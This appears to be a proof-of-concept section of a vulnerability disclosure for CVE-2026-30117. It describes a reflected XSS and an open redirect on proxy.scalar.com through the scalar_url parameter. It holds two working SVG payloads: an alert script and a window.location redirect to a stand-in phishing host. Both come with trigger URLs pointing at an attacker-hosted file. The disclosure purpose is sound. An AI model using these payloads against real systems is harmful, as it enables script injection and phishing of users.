## CVE-2026-30117 — XSS & Open Redirect via scalar_url

> For full writeup, CVSS vectors, and impact analysis see [README.md](./README.md).

---

### 1. Reflected XSS via SVG

**Endpoint:** `https://proxy.scalar.com/`
**Parameter:** `scalar_url`
**Severity:** High

The proxy fetches an attacker-hosted SVG and returns it to the victim's browser without
sanitization. The embedded `<script>` tag executes in the context of `proxy.scalar.com`.

**poc-xss.svg:**

```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
  <script type="text/javascript">
    alert('XSS-Test-PoC');
  </script>
</svg>
```

**Trigger URL:**

```
https://proxy.scalar.com/?scalar_url=https://attacker-host.com/poc-xss.svg
```

When the victim visits this URL, the script executes in the browser under the
`proxy.scalar.com` origin.

---

### 2. Open Redirect via SVG

**Endpoint:** `https://proxy.scalar.com/`
**Parameter:** `scalar_url`
**Severity:** Medium

Same mechanism — SVG payload uses `window.location.replace()` to silently forward the
victim to an attacker-controlled URL. The link appears to originate from `scalar.com`.

**poc-redirect.svg:**

```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
  <script>
    window.location.replace("https://attacker.com/phishing");
  </script>
</svg>
```

**Trigger URL:**

```
https://proxy.scalar.com/?scalar_url=https://attacker-host.com/poc-redirect.svg
```

Victim is redirected to `attacker.com` immediately on page load.
